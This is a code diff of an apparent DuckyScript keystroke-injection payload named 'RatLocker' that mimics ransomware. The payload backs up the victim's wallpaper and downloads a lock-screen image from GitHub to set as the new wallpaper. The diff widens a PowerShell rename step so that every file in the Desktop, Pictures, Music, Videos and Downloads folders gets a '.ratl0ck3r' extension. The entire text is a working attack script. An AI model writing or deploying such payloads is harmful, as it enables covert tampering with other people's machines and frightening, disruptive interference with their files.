@@ -13,15 +13,13 @@ ENTER
 DELAY 250
 
 REM Backup Wallpaper
-STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $home\pictures\wallpaper.ratl0ck3r
-ENTER
+STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination C:\Users\marha\AppData\Local\Temp\YourOldWallpaper.png
 DELAY 250
 
 REM download new wallpaper
-STRING Invoke-WebRequest [PLACEHOLDER FOR NOW] -OutFile C:\temp\bg.jpg
-
+STRING Invoke-WebRequest https://raw.githubusercontent.com/WalkTheEarth/ratlocker/main/RatLocker.png -OutFile C:\Users\marha\AppData\Local\Temp\RatLocker.png
 REM Set new wallpaper
-STRING $MyWallpaper="$home\pictures\ratl0ck3r.png"
+STRING $MyWallpaper="C:\Users\marha\AppData\Local\Temp\RatLocker.png"
 ENTER
 STRING $code = @'
 ENTER
@@ -55,4 +53,12 @@ DELAY 500
 
 REM Add ratl0ck3r extension
 STRING dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+ENTER
+STRING dir $HOME\Pictures\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+ENTER
+STRING dir $HOME\Music\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+ENTER
+STRING dir $HOME\Videos\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+ENTER
+STRING dir $HOME\Downloads\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
 ENTER
